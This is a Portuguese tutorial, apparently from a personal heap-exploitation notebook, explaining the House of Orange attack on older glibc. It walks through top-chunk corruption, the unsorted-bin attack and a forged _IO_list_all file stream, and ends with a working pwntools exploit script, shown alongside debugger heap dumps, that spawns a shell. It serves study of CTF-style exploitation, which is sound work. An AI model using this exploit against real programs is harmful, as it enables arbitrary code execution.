- [House Of Orange](#house-of-orange)
- [Teoria](#teoria)
  - [Gerar um Free Chunk](#gerar-um-free-chunk)
    - [Extensão do heap](#extensão-do-heap)
  - [Unsorted Bins](#unsorted-bins)
  - [Corromper _IO_list_all](#corromper-_io_list_all)
- [Exploit](#exploit)
  - [Heap Extension](#heap-extension)
  - [Unsorted Bins + IO_list_all](#unsorted-bins--io_list_all)

# House Of Orange
# Teoria
O ataque da House Of Orange se consiste em:
- Gerar um free chunk
  - Por exemplo, ativando o código de extensão do heap 
- Corromper o free chunk
- [Ataque dos Unsorted Bins](https://0xturazzi.github.io/book/heap/malloc/PartialUnlink.html)
- [Corromper _IO_list_all](https://0xturazzi.github.io/book/heap/relacionados/io_list_all.html)
    - Método: Forjar chunk falso no heap

> OBS: Glibc <= 

## Gerar um Free Chunk
Para executar esse ataque, voce vai precisar de um free chunk nos unsorted 
bins. Ele obviamente pode ser corrompido com um `write-after-free` ou overflow.

Porem um técnica que costuma vir combinada com a HoO é ativar o código de 
extensão do heap

### Extensão do heap
Explicada melhor em breve, porem resumindo... Corromper o top chunk com:
```
PAGE_SIZE    -    usado     +      1
0x1000       soma do tamanho   PREV_INUSE
              dos chunks ja
                alocados
``` 

E alocar um chunk grande, fazendo com que malloc:
- Crie um novo heap em outra parte da memoria
- Transforme o resto do heap antigo em um free chunk
- Coloque FencePost chunks no final do heap antigo

> Fencepost: Chunk de tamanho ilegal 0x10 usado para evitar que malloc leia regiões 
> nao alocadas da memoria (gerando `SEGFAULT`) quando olhando os chunks para frente!

Assim, nos conseguimos um free chunk mesmo que o programa nunca chame free 
diretamente!

## Unsorted Bins
O Ataque ja foi descrito em outro post, então nao vou perder muito tempo aqui,
o fato a se ressaltar é que na HoO idealmente devemos realizar o parcial unlink 
por meio de um **SORT** !! 

Alem disso, apos o sort, ele precisa ser a head do seu respectivo fastbin. 
Portanto sera necessário voce preparar o heap anteriormente caso ja exista 
algo la antes...

Isto ocorre pois quando realizarmos o unsorted bins vamos escrever o 
**ENDEREÇO DA HEAD**, e o valor nesse endereço sera o nosso chunk

## Corromper _IO_list_all

O alvo do nosso unsorted bins sera o _IO_list_all

Porem, ele nao vai passar os checks de segurança do unlink, mas isso nao é um 
problema, pois em versões do **Glibc <=** os `overflows` do `stdio` (e outras  
filestreams) ainda serão chamados, nos permitindo executar o ataque do 
IO_list_all :D

Assim, uma parte da `main arena` sera interpretada como uma filestream, porem 
nao passara os checks de `mode`, etcetc

Assim, o seu `_chain` sera seguido, e justamente nesse endereço precisamos dar 
o sort para a head mencionada anteriormente! Agora, o nosso chunk sera tratado 
como uma filestream, e nos podemos passar os checks de segurança e forjar uma 
vtable. 

Assim ganhando a shell apos as mitigações do Glibc serem ativadas e `abort()` 
chamado, no ultimo segundo do processo de finalização!

# Exploit
## Heap Extension
Vamos supor que o programa tenha chunk tem tamanho `0x20` e ao 
edita-lo temos um overflow. Assim podemos criar um helper no nosso 
exploit para editar esse chunk: `edit_vuln()`

Também vamos supor que esse foi o primeiro e único chunk, assim fazendo 
fronteira com o `top chunk`, e tornando a quantidade usada do heap = `0x20`

> Para a técnica, o único requerimento é poder corromper o top chunk, essas 
> condições ideais sao somente para simplificar a explicação

```x86asm
Allocated chunk | PREV_INUSE
Addr: 0x55bca860c000
Size: 0x21
```

Por ultimo, nos temos um helper que nos permite alocar um chunk 
grande: `malloc_grande()`

Assim, podemos corromper o tamanho do top chunk usando:
```py
usado = 0x20 # Quanto do heap ja foi usado, por exemplo 0xa0, 0xc0,...

edit_vuln(flat(
  0,
  0,
  0,
  0x1000 - usado + 1  
))

malloc_grande()
```

Agora temos um free chunk, nos unsorted bins, logo apos o chunk do 
overflow

```x86asm
Allocated chunk | PREV_INUSE
Addr: 0x55bca860c000
Size: 0x21

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55bca860c020
Size: 0xfc1
fd: 0x7f06c67a6b78
bk: 0x7f06c67a6b78

Allocated chunk
Addr: 0x55bca860cfe0
Size: 0x10

Allocated chunk | PREV_INUSE
Addr: 0x55bca860cff0
Size: 0x11

Allocated chunk
Addr: 0x55bca860d000
Size: 0x00
```

```x86asm
0x55bca860c000  0x0000000000000000  0x0000000000000021   <-- Vuln Chunk
0x55bca860c010  0x0000000000000000  0x0000000000000000
0x55bca860c020  0x0000000000000000  0x0000000000000fc1   <-- unsortedbin[all][0]
0x55bca860c030  0x00007f06c67a6b78  0x00007f06c67a6b78
0x55bca860c040  0x0000000000000000  0x0000000000000000
0x55bca860c050  0x0000000000000000  0x0000000000000000
0x55bca860c060  0x0000000000000000  0x0000000000000000
0x55bca860c070  0x0000000000000000  0x0000000000000000
0x55bca860c080  0x0000000000000000  0x0000000000000000
0x55bca860c090  0x0000000000000000  0x0000000000020f71  
0x55bca860c0a0  0x0000000000000000  0x0000000000000000
...
...
...
0x55bca860cfa0  0x0000000000000000  0x0000000000000000
0x55bca860cfb0  0x0000000000000000  0x0000000000000000
0x55bca860cfc0  0x0000000000000000  0x0000000000000000
0x55bca860cfd0  0x0000000000000000  0x0000000000000000
0x55bca860cfe0  0x0000000000000fc0  0x0000000000000010   <-- Fenceposts
0x55bca860cff0  0x0000000000000000  0x0000000000000011
```


## Unsorted Bins + IO_list_all
Como o ataque nos unsorted bins ira causar um `abort`, ja precisamos preparar 
os dois ao mesmo tempo, criando a `file stream` falsa no chunk que também 
usamos para o unsorted bins.

```py
edit(flat(
    libc.sym.system,# vtable + 0x18
    0,#                         IO_list_all | Unsorted Bin
    b"/bin/sh\0",#                    flags |
    0x60 + 1,#                              | size
    0,#                                     | fd
    libc.sym._IO_list_all - 16,#            | bk (alvo)
    1,#                          write base | 
    2,#                          write ptr  |
    '\0'*8*21,
    heap - 8,#                       vtable |
))
```

E o heap fica:
```x86asm
0x5653aa00f000  0x0000000000000000  0x0000000000000021   <-- Vuln Chunk
0x5653aa00f010  0x00007f094febf830  0x0000000000000000  
0x5653aa00f020  0x0068732f6e69622f  0x0000000000000061   <-- unsortedbin[all][0]
0x5653aa00f030  0x0000000000000000  0x00007f095021a510
0x5653aa00f040  0x0000000000000001  0x0000000000000002
0x5653aa00f050  0x0000000000000000  0x0000000000000000
0x5653aa00f060  0x0000000000000000  0x0000000000000000
0x5653aa00f070  0x0000000000000000  0x0000000000000000

O pwndbg somente le ate aqui, mas lembrando que tem aqueles 900 zeros seguido dos fenceposts
```

Ou simplificando

```x86asm
0x0000000000000000  0x0000000000000021      <-- Vuln Chunk
      SYSTEM        0x0000000000000000 <- vtable+0x18
     /bin/sh                SIZE            <-- unsortedbin[all][0]
0x0000000000000000      _IO_list_all   <- Unsorted: BK
     write_base          write_ptr     
0x0000000000000000  0x0000000000000000
0x0000000000000000  0x0000000000000000
0x0000000000000000  0x0000000000000000
...
...
Algum lugar aqui o Vtable pointer
...
...
Fenceposts
```

Agora basta um malloc para fazer o unsorted chunk sofrer **SORT** e acionar nosso 
ataque...

Como o `abort` chegou a ser chamado, um backtrace, mapa da memoria, etcetc sera 
printado, para dar uma vibe mais polida para o exploit basta adicionar:
```
io.recvuntil("[vdso]\n")
io.interactive()
```


Lembrando que por culpa do ataque no _IO_list_all, essa técnica so te da uma shell
50% das vezes!

Caso voce queira, voce pode colocar o ataque todo dentro de `main()` e fazer:
```py
while True:
    try: 
        main()
    except:
        continue
    quit()
```
Assim temos:
```py
def main():
  #################################
  #          Inicializar          #
  #################################

  # elf = ELF( alvo123 )
  # io = process(elf.path)
  # libc = elf.libc

  #################################
  #        Heap libc Leak        #
  #################################

  # heap = bla bla bla
  # libc.address = bla bla bla

  #################################
  #        House Of Orange        #
  #################################
  # Extender Heap
  usado = 0x20 # Quanto do heap ja foi usado, por exemplo 0xa0, 0xc0,...
  edit_vuln(flat(
    0,
    0,
    0,
    0x1000 - usado + 1  
  ))
  malloc_grande()
  # Unsorted + _IO_list_all
  edit(flat(
      libc.sym.system,# vtable + 0x18
      0,#                         IO_list_all | Unsorted Bin
      b"/bin/sh\0",#                    flags |
      0x60 + 1,#                              | size
      0,#                                     | fd
      libc.sym._IO_list_all - 16,#            | bk (alvo)
      1,#                          write base | 
      2,#                          write ptr  |
      '\0'*8*21,
      heap - 8,#                       vtable |
  ))

  # Qualquer malloc agora acionaria o sort
  malloc_grande()
  io.recvuntil("[vdso]\n")
  io.interactive()


while True:
    try: 
        main()
    except:
        continue
    quit()
```